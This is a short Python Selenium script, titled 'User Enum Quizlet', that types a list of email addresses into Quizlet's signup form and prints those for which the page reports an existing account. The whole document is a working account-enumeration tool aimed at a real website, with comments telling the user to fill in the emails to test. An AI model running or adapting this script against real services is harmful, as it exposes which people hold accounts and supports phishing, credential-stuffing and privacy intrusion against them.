# User Enum Quizlet
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from time import sleep
import extract_html_diff

print("The usernames present in quizlet are:")
# Place all the Email IDs to test in the for loop as shown below.
# You can remove all the Email IDs below
for i in ["superman@gmail.com", "batman@gmail.com", "sdkfnsdkfnksdnfksdf@gmail.com"]:
    user = i

    # Using edge browser
    driver = webdriver.Edge(executable_path='msedgedriver')

    # Using Firefox browser
    # driver = webdriver.FirefoxProfile()
    # driver = webdriver.Firefox(driver)

    driver.get("https://quizlet.com/")
    element = driver.find_element_by_xpath("//*[@id='TopNavigationReactTarget']/header/div/div[2]/div[3]/button[2]/span")
    element.click()
    sleep(1)

    p1 = driver.page_source

    elem = driver.find_element_by_xpath("//input[@type='email']")
    elem.send_keys(user)
    elem.send_keys(Keys.TAB)
    sleep(2)

    p2 = driver.page_source
    p3 = extract_html_diff.as_string(p2, p1)
    if "It looks like" in p3:
        print(user)
    driver.close()